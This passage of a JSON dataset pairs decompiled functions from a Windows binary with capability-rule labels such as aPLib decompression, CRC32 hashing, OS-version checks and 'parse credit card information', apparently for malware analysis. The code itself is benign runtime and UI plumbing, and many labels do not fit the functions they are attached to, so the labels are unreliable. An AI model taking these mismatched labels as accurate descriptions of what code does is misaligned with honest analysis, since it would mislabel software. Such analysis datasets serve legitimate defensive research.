        "decompiled_code": "\nvoid fcn.00409ea9(void)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    char *pcVar6;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_18h;\n    uint var_11h;\n    \n    *(unaff_EBP + -0x34) = unaff_ESI;\n    iVar5 = 0x7fff;\n    iVar4 = 0;\n    *(unaff_EBP + -0x18) = 0xffffffff;\n    *(unaff_EBP + -0x35) = 0;\n    *(unaff_EBP + -0x11) = 0;\n    iVar3 = 0;\ncode_r0x00409ec3:\n    do {\n        cVar2 = *unaff_ESI;\n        unaff_ESI = unaff_ESI + 1;\n        while (cVar2 != '#') {\n            if (cVar2 == '0') {\n                if (iVar3 < iVar5) {\n                    iVar5 = iVar3;\n                }\n                iVar4 = iVar3 + 1;\n                iVar3 = iVar4;\n                goto code_r0x00409ec3;\n            }\n            if (cVar2 == '.') {\n                if (*(unaff_EBP + -0x18) == -1) {\n                    *(unaff_EBP + -0x18) = iVar3;\n                }\n                goto code_r0x00409ec3;\n            }\n            if (cVar2 == ',') {\n                *(unaff_EBP + -0x35) = 1;\n                goto code_r0x00409ec3;\n            }\n            pcVar6 = unaff_ESI;\n            if ((cVar2 == '\\'') || (cVar2 == '\\\"')) goto code_r0x00409f0f;\n            if ((cVar2 != 'E') && (cVar2 != 'e')) {\n                if ((cVar2 == ';') || (cVar2 == '\\0')) goto code_r0x00409f2e;\n                goto code_r0x00409ec3;\n            }\n            pcVar6 = unaff_ESI + 1;\n            cVar2 = *unaff_ESI;\n            if ((cVar2 == '-') || (unaff_ESI = pcVar6,  cVar2 == '+')) {\n                *(unaff_EBP + -0x11) = 1;\n                do {\n                    unaff_ESI = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                    pcVar6 = unaff_ESI;\n                } while (cVar2 == '0');\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while( true );\ncode_r0x00409f0f:\n    unaff_ESI = pcVar6 + 1;\n    cVar1 = *pcVar6;\n    if (cVar1 == cVar2) goto code_r0x00409ec3;\n    pcVar6 = unaff_ESI;\n    if (cVar1 == '\\0') {\ncode_r0x00409f2e:\n        *(unaff_EBP + -0x10) = iVar3;\n        if (*(unaff_EBP + -0x18) == -1) {\n            *(unaff_EBP + -0x18) = iVar3;\n        }\n        iVar3 = *(unaff_EBP + -0x18) - iVar4;\n        if (iVar3 != 0 && iVar4 <= *(unaff_EBP + -0x18)) {\n            iVar3 = 0;\n        }\n        *(unaff_EBP + -0x3c) = iVar3;\n        iVar3 = *(unaff_EBP + -0x18) - iVar5;\n        if (*(unaff_EBP + -0x18) < iVar5) {\n            iVar3 = 0;\n        }\n        *(unaff_EBP + -0x40) = iVar3;\n        return;\n    }\n    goto code_r0x00409f0f;\n}\n",
        "token_count": 920
    },
    "0041b0d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0041b0d0(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 60
    },
    "0041f758": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f758(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041c52c();\n    if (iVar1 != -1) {\n        fcn.0041c3a4();\n    }\n    iVar1 = fcn.0041c52c();\n    if (iVar1 < 0) {\n        fcn.0041c358();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0041facc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041facc(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004184c0();\n    if (iVar1 == -1) {\n        fcn.0041fa94();\n    }\n    return iVar1;\n}\n",
        "token_count": 61
    },
    "0043d158": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d158(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        fcn.0043dc90();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.0043d208();\n    }\n    else {\n        fcn.0043eaa0();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x68))();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0044ad84": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ad84(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x44adaf;\n    himl = param_2;\n    fcn.0041b080(&fcn.0044ad84::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x44adb7;\n    fcn.0044ba40();\n    uStack72 = 0x44af1d;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x44add1;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.0042b3a8();\n    uStack84 = 0x44af00;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x44adf0;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x44adfe;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x44ae0a;\n    var_10h = fcn.0042b3a8();\n    uStack96 = 0x44aee3;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.0042c6e8();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.0042b978();\n                fcn.00426ca8();\n                uVar2 = fcn.0042704c(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.0042b978();\n                fcn.00426ca8();\n                fcn.0042704c(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.0044a958();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x44aeea;\n    uStack100 = 0x44aee2;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 807
    },
    "0044f7ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0044f7ec(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044f7b8();\n    if (iVar1 == -1) {\n        fcn.0044ca50();\n    }\n    fcn.0044f694();\n    return;\n}\n",
        "token_count": 69
    },
    "00451094": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451094(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.004508a8();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.004508a8();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0045444c();\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0045ae7c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0045ae7c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.0045af50();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 127
    },
    "00461790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00461790(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack48;\n    int32_t iStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack36 = &fcn.00461790::var_1h + 1;\n    var_ch = 0;\n    uStack40 = 0x461945;\n    iStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_1h._0_1_ = **0x4847fc;\n    fcn.004047b0();\n    iVar1 = fcn.00404bcc();\n    if (iVar1 < 1) {\n        if (param_2 < 1) {\n            if (param_2 == 0) {\n                puStack48 = 0x4618cd;\n                fcn.00404660();\n            }\n            else {\n                puStack48 = &fcn.00461790::var_ch;\n                fcn.00404888();\n                uVar3 = param_2;\n                fcn.00404ae8();\n                iVar2 = fcn.00404888();\n                if (0x34 < *(in_EAX + iVar2)) {\n                    fcn.00461650(&fcn.00461790::var_1h + 1);\n                }\n                if (0x7fffffff < uVar3) {\n                    do {\n                        fcn.00404890();\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 != 0);\n                }\n            }\n        }\n        else {\n            puStack48 = 0x4618bc;\n            fcn.00404660();\n        }\n    }\n    else if (param_2 < 1) {\n        if (param_2 == 0) {\n            puStack48 = &fcn.00461790::var_ch;\n            fcn.00404ae8();\n            iVar2 = fcn.00404888();\n            if (0x34 < *(in_EAX + 1 + iVar2)) {\n                fcn.00461650(&fcn.00461790::var_1h + 1);\n            }\n        }\n        else {\n            puStack48 = &fcn.00461790::var_ch;\n            fcn.00404ae8();\n            iVar2 = fcn.00404888();\n            if (0x34 < *(in_EAX + iVar2)) {\n                fcn.00461650(&fcn.00461790::var_1h + 1);\n            }\n            uVar3 = param_2;\n            if (0x7fffffff < uVar3) {\n                do {\n                    fcn.00404890();\n                    uVar3 = uVar3 + 1;\n                } while (uVar3 != 0);\n            }\n        }\n    }\n    else {\n        puStack48 = &fcn.00461790::var_ch;\n        fcn.00404ae8();\n        iVar2 = fcn.00404888();\n        if (0x34 < *(in_EAX + iVar2)) {\n            fcn.00461650(&fcn.00461790::var_1h + 1);\n        }\n    }\n    fcn.0040461c();\n    *in_FS_OFFSET = puStack48;\n    uStack40 = 0x46194c;\n    iStack44 = 0x461944;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 848
    },
    "004047f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047f0(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x00404819:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x00404816:\n                piVar2 = piVar2 + 1;\n                goto code_r0x00404819;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x00404816;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.004045c8(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004046e8(arg_8h),  -1 < iVar1)) {\n        fcn.004046b8();\n    }\n    else {\n        fcn.00404c14();\n        fcn.004046e8(arg_8h);\n        fcn.00404c14();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00404850": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404850(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.004045c8(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004046e8(arg_8h),  -1 < iVar1)) {\n        fcn.004046b8();\n    }\n    else {\n        fcn.00404c14();\n        fcn.004046e8(arg_8h);\n        fcn.00404c14();\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "00404d10": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00404d10(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 != 0) && (*(param_2 + -4) >> 1 != 0)) {\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 != 0) {\n            return;\n        }\n        if (*0x485008 != NULL) {\n            (**0x485008)();\n        }\n        fcn.00402c3c();\n        return;\n    }\n    iVar1 = *in_EAX;\n    if (iVar1 != 0) {\n        *in_EAX = 0;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "00404de4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00404de4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00404e0d:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00404e0a:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00404e0d;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00404e0a;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x485008 != NULL) {\n        (**0x485008)();\n    }\n    fcn.00402c3c();\n    return;\n}\n",
        "token_count": 452
    },
    "00404e40": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00404e40(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041e824": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e824(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041e50c();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041e824(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 398
    },
    "00463460": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004634a3)\n\nvoid __fastcall fcn.00463460(uint param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint uStack48;\n    \n    puVar7 = &uStack48;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = *param_2;\n        param_2 = param_2 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = *param_2;\n    uVar1 = 0;\n    uVar6 = *in_EAX >> 1;\n    if (-1 < uVar6 - 1) {\n        puVar4 = in_EAX + 2;\n        puVar3 = &uStack48 + 2;\n        uVar5 = uVar6;\n        do {\n            *puVar4 = uVar1;\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    in_EAX[uVar6 + 2] = uVar1;\n    if ((uVar6 & 0x80000001) == 1) {\n        in_EAX[uVar6 + 3] = uVar1 & 0xf;\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "0047efec": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.0047efec(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uint var_4h;\n    \n    *0x486014 = *(*0x485fd4 + 0xa4);\n    piVar2 = in_EAX;\n    while (*0x486010 = piVar2,  *0x486010 - in_EAX < *0x486014) {\n        uVar1 = (*0x486010)[1] - 8U >> 1;\n        *0x486018 = *0x486010 + 2;\n        *0x48601c = uVar1;\n        do {\n            if ((**0x486018 & 0xf900) != 0) {\n                piVar2 = **0x486010 + *0x485fcc + (**0x486018 & 0xfff);\n                *piVar2 = *piVar2 + *0x485fd0;\n            }\n            *0x486018 = *0x486018 + 2;\n            uVar1 = uVar1 - 1;\n            piVar2 = *0x486018;\n        } while (uVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "00404f94": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00404f94(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00404f94();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00404f64();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x485008 != NULL) {\n                (**0x485008)();\n            }\n            fcn.00402c3c();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 513
    },
    "00405190": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00405190(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.00402d34();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.0040461c();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00404d10();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00405178();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.004052ac(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00405190();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.004062b0();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x485008 != NULL) {\n                    (**0x485008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402c3c();\n                return;\n            }\n            fcn.00405b80();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.00402d34();\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "004052ac": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __thiscall fcn.004052ac(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.0040461c();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00404d10();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00405178();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.004052ac();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00405190();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.004062b0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x485008 != NULL) {\n                (**0x485008)();\n            }\n            fcn.00402c3c();\n            return;\n        }\n        do {\n            fcn.00405b80();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 443
    },
    "00462df0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462df0(uint param_1, uint param_2)\n\n{\n    if (9 < param_2 + (param_2 >> 8)) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "00462e00": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462e00(uint param_1, uint param_2)\n\n{\n    if (10 < param_2 - (param_2 >> 8)) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "004223a4": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004223a4(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.00422514();\n        fcn.0042232c();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.00422514();\n        fcn.0042232c();\n    }\n    else {\n        fcn.00422514();\n        fcn.0042232c();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "004075ec": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004075ec(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX | (param_2 & 0xff0000) << 8;\n}\n",
        "token_count": 56
    },
    "00409e6e": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e6e(uint arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t unaff_EBP;\n    char *pcVar3;\n    char *pcVar4;\n    \n    pcVar3 = *(unaff_EBP + 8);\n    if (in_ECX != 0) {\n        do {\n            while( true ) {\n                pcVar4 = pcVar3 + 1;\n                cVar1 = *pcVar3;\n                if ((cVar1 != '\\'') && (cVar1 != '\\\"')) break;\n                while( true ) {\n                    pcVar3 = pcVar4 + 1;\n                    cVar2 = *pcVar4;\n                    if (cVar2 == cVar1) break;\n                    pcVar4 = pcVar3;\n                    if (cVar2 == '\\0') {\n                        return;\n                    }\n                }\n            }\n        } while ((cVar1 != '\\0') && ((pcVar3 = pcVar4,  cVar1 != ';' || (in_ECX = in_ECX + -1,  in_ECX != 0))));\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "00460574": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint fcn.00460574(void)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 2) < 0xd) {\n        uVar1 = fcn.0045f754();\n        if ((((*(in_EAX + 4) <= uVar1) && (*(in_EAX + 6) < 0x18)) && (*(in_EAX + 8) < 0x3c)) && (*(in_EAX + 10) < 0x3c))\n        {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 137
    },
    "0046bca8": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
